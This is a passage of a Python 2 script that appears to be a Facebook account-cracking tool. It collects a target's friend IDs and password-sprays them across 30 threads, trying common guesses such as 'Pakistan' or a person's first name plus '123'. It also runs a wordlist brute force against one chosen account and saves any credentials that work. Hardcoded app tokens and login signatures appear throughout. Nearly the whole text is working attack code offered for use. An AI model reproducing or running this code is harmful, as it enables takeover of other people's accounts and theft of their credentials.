		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:SOMI
        time.sleep(0.05)
	print logo2
	print "\033[1;97mLogged in User Info"
        time.sleep(0.05)
	print "	  \033[1;97m Name\033[1;93m:\033[1;96m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   ID\033[1;91m:\033[1;93m"+id+"\x1b[1;93m              "
        time.sleep(0.05)
        print "033[1;91m==========================\033[1;97m"
        time.sleep(0.05)
	print "1 .\x1b[1;95m\033[1;94mStart Cloning   "
        time.sleep(0.05)
        print "2 .\x1b[1;94m\033[1;94mStart Target Hacking        "
        time.sleep(0.05)
	print "0 .\033[1;91m\033[1;94mLogout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97mChoose Option ---> \033[1;97m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo19
	print "1 .\x1b[1;93mStart Cloning    "
        time.sleep(0.05)
	print "0. \033[1;93mBack"
	pilih_crack()

def pilih_crack():
	peak = raw_input("\n\033[1;96mChoose an Option ---> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	elif peak =="1":
		os.system('clear')
		print logo
		jjt = raw_input("\033[1;92mEnter ID : \033[1;92m")
		print "►▸▹►▸▹►▸▹►►▸▹►▸▹►▸▹►▸▹◃◄◅◃◄◅◃◄◅▸▹◃◄◅◃◄◅◃◄◅"
		try:
			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
			td = json.loads(m.text)
			print"\033[1;94mName\033[1;94m:\033[1;94m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
			crack()
		print"\033[1;97mGetting IDs\033[1;97m..."
		n = requests.get("https://graph.facebook.com/"+jjt+"/friends?access_token="+toket)
		d = json.loads(n.text)
		for c in d['data']:
			id.append(c['id'])
	elif peak =="0":
		men()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_crack()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;97m"+str(len(id))
	jalan('\033[1;97mPlease Wait\033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;94m"+o),;sys.stdout.flush();time.sleep(1)
	print "\033[1;96mTo Stop Process Press CTRL then Z"
	print "\033[1;91m-------------------------------------------------------------------"
	jalan(' \033[1;95mPlz Wait Cloned Accounts Will Appear Here')
        jalan(' \033[1;95m      Started Cloning Wait A while ☕ ')
	print "\033[1;91m----------------------------------------"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('cookie')
		except OSError:
			pass #Dev:SOMI
		try:
			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			y = json.loads(k.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			s = json.load(data)
			if 'access_token' in s:
				print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in s["error_msg"]:
					print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "k")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					s = json.load(data)
					if 'access_token' in s:
						print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in s["error_msg"]:
							print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "k")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = y['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							s = json.load(data)
							if 'access_token' in s:
								print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in s["error_msg"]:
									print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "k")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = y['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									s = json.load(data)
									if 'access_token' in s:
										print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in s["error_msg"]:
											print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "k")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = y['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											s = json.load(data)
											if 'access_token' in s:
												print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in s["error_msg"]:
													print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "k")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = y['first_name'] + '786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													s = json.load(data)
													if 'access_token' in s:
														print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in s["error_msg"]:
															print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "k")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan1'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															s = json.load(data)
															if 'access_token' in s:
																print '\x1b[1;93mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in s["error_msg"]:
																	print '\x1b[1;93mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "k")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
	print "  Written By SOMI" #Dev:SO MI
	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
        print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(oks))+"\033[1;96m/\033[1;96m"+str(len(cekpoint))
	print """


\033[1;96m_____________¶____¶_______________________________
\033[1;96m____________¶¶____¶¶______________________________
\033[1;96m___________¶¶¶___¶¶¶______________________________
\033[1;96m___________¶¶¶___¶¶¶______________________________
\033[1;96m___________¶¶___¶¶¶_______________________________
\033[1;96m___________¶¶___¶¶________________________________
\033[1;96m___________¶¶_¶¶__________________________________
\033[1;96m___________¶¶¶____________________________________
\033[1;96m____________¶¶____________________________________
\033[1;96m_____________888¶¶________________________________
\033[1;96m____________¶¶¶_8¶¶_______________________________
\033[1;96m____________¶¶¶¶_88¶______________________________
\033[1;96m_____________¶¶¶8_88¶_____________________________
\033[1;96m_____________8¶¶¶8_88¶____________________________
\033[1;96m______________¶¶¶¶__888___________________________
\033[1;96m______________¶¶¶¶¶_88¶8__________________________
\033[1;96m_______________¶¶¶¶¶_88¶8_________________________
\033[1;96m________________¶¶¶¶8_88¶8________________________
\033[1;96m________________¶¶¶¶¶__88¶________________________
\033[1;96m_________________¶¶¶¶¶_88¶________________________
\033[1;96m_________________¶¶¶¶¶¶_88¶_______________________
\033[1;96m________________¶¶¶¶¶¶¶8_88¶______________________
\033[1;96m______________8¶88¶88¶¶¶8_¶8¶_____________________
\033[1;96m______________¶¶_8¶¶¶¶¶¶¶_8¶8¶8___________________
\033[1;96m______________8¶8_8¶¶¶¶¶¶¶8¶¶8¶¶__________________
\033[1;96m_______________¶¶_8¶¶8¶¶¶¶88¶¶8¶¶8________________
\033[1;96m____________8888¶¶¶¶¶88¶¶8¶88¶¶¶¶8________________
\033[1;96m_________8888_88¶¶¶¶¶¶¶¶¶¶8¶__¶¶¶_________________
\033[1;96m________8_8888__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________________
\033[1;96m_______8_888_888___888¶¶¶¶¶¶¶¶¶¶__________________
\033[1;96m______8__8¶8__¶¶8_____88¶¶¶¶¶¶8___________________
\033[1;96m_____¶¶8888888__8888____8¶¶¶¶¶¶8__________________
\033[1;96m____¶¶¶¶¶¶88¶8___8¶¶88_8¶¶¶¶¶8¶8__________________
\033[1;96m___¶¶¶¶¶¶¶¶¶¶___8¶¶¶¶¶¶¶¶¶¶8_____________________
\033[1;96m_____¶¶¶8¶¶¶¶8__888¶¶888¶¶¶¶¶¶____________________
\033[1;96m______¶¶¶¶888¶8_88¶¶¶¶¶¶¶¶¶¶¶¶¶___________________
\033[1;96m_______¶¶¶¶888¶¶¶¶¶8¶¶¶¶¶¶¶¶¶¶¶¶__________________
\033[1;96m_______¶¶¶¶¶¶¶¶¶¶¶8___¶¶¶¶8¶¶¶¶¶¶_________________
\033[1;96m______8¶¶¶¶¶¶¶¶¶¶______¶88¶¶¶¶¶¶¶¶8_______________
\033[1;96m______¶8¶¶¶¶¶¶¶¶8______¶¶¶¶¶¶8888¶¶8______________
\033[1;96m_____8¶8¶¶¶8¶¶¶¶________¶¶¶888__8888¶8____________
\033[1;96m____8¶¶¶¶¶8¶¶¶¶¶________8¶8__88____888¶8__________
\033[1;96m___88_88¶¶¶¶¶¶¶__________88__888______88¶8________
\033[1;96m__88______888¶____________8____88________8¶8______




\033[1;92m ERROR ID AFTER 2 WEEKS (14DAYS)

"""
	
	raw_input("\n\033[1;92m[\033[1;92mBack\033[1;92m]")
	crack()
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo14
        print '-----------------------------------------------------------'
        try:
            email = raw_input('\x1b[1;96mID\x1b[1;95m/\x1b[1;95mEmail \x1b[1;95mTarget \x1b[1;95m:\x1b[1;95m ')
            passw = raw_input('\x1b[1;95mWordlist \x1b[1;95m(Type--> dvl.list) \x1b[1;95m: \x1b[1;95m')
            total = open(passw, 'r')
            total = total.readlines()
            print '------------------------------------------------------------'
            print '\x1b[1;94m[\x1b[1;94m\xe2\x9c\x93\x1b[1;97m] \x1b[1;94mTarget \x1b[1;94m:\x1b[1;94m ' + email
            time.sleep(0.05)
            print '\x1b[1;94mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;94mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;94m[\xe2\x9c\xba] \x1b[1;94mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;97mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' ● ' + pw + '\n')
                        dapat.close()
                        print '\x1b[1;95mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\x1b[1;92mFounded.'
                            print  "--------------------------------------------------"
                            print '\x1b[1;91m[!] \x1b[1;97mAccount Maybe Checkpoint'
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect """
            super()
            
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;93mToken\033[1;91m : Enter Acces Token Here :- ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;97m[?] \033[1;97mToken Invalid Refresh Page\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print 'Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print 'successfully generate access token'
		print 'Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print 'Failed to generate access token'
		print 'Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print 'Failed to generate access token'
		print 'Connection error !!!'
		os.remove('cookie/token.log')
		menu()
		
          
if __name__ == '__main__':
	login()
